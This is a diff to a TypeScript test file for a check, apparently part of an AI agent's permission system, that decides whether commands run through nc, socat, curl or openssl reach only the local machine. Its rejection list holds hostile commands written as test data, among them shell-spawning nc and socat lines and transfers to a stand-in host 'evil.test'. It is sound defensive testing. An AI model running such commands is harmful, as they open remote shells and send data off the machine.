@@ -1,9 +1,10 @@
 // What a shell network client names, read only when that is this machine and
 // nothing else. The allowed forms are the ones the Terminal-Bench 2.0 run
 // (2026-10-20) refused while the model checked a server it had just started.
-import { describe, expect, it } from "vitest";
+import { afterEach, describe, expect, it } from "vitest";
 import { commandPositions } from "./shell-command-positions.js";
 import { loopbackUse } from "./shell-loopback-clients.js";
+import { _setInterfaceAddressesForTests } from "./loopback-grant.js";
 
 const use = (cmd: string) => loopbackUse(commandPositions(cmd).positions[0]);
 
@@ -22,6 +23,7 @@ describe("loopbackUse", () => {
     ["nc -w 2 127.0.0.1 6379", ["6379"]],
     ["telnet 127.0.0.1 6665", ["6665"]],
     ["socat - TCP:127.0.0.1:6665", ["6665"]],
+    ["openssl s_client -connect localhost:8443 -servername localhost", ["8443"]],
   ];
   for (const [cmd, ports] of local) it(`only this machine: ${cmd}`, () => expect(use(cmd)?.ports).toEqual(ports));
 
@@ -44,7 +46,21 @@ describe("loopbackUse", () => {
     "ssh root@10.0.0.5", "scp file root@localhost:/tmp/ user@evil.test:/x",
     "nc -l -p 4444", "nc -e /bin/sh 127.0.0.1 4444", "nc -z evil.test 443", "nc 127.0.0.1",
     "socat TCP-LISTEN:9,fork EXEC:/bin/sh", "socat - TCP:evil.test:443", "socat - TCP:127.0.0.1:80,proxyport=3128",
+    "openssl s_client -connect evil.test:443", "openssl s_client -proxy p.test:3128 -connect localhost:8443",
+    "openssl s_client -connect localhost:8443 -connect evil.test:443", "openssl s_server -accept 4433",
     "curl", "ls",
   ];
   for (const cmd of elsewhere) it(`not only this machine: ${cmd}`, () => expect(use(cmd)).toBeNull());
+});
+
+describe("this machine's own interface address", () => {
+  afterEach(() => _setInterfaceAddressesForTests(null));
+
+  it("is this machine for every client; another address on the same network is not", () => {
+    _setInterfaceAddressesForTests(() => ["127.0.0.1", "172.28.0.2"]);
+    expect(use("curl -s http://172.28.0.2:5000/sentiment")?.ports).toEqual(["5000"]);
+    expect(use("nc -z 172.28.0.2 5000")?.ports).toEqual(["5000"]);
+    expect(use("curl -s http://172.28.0.3:5000/sentiment")).toBeNull();
+    expect(use("ssh root@10.0.0.5")).toBeNull();
+  });
 });
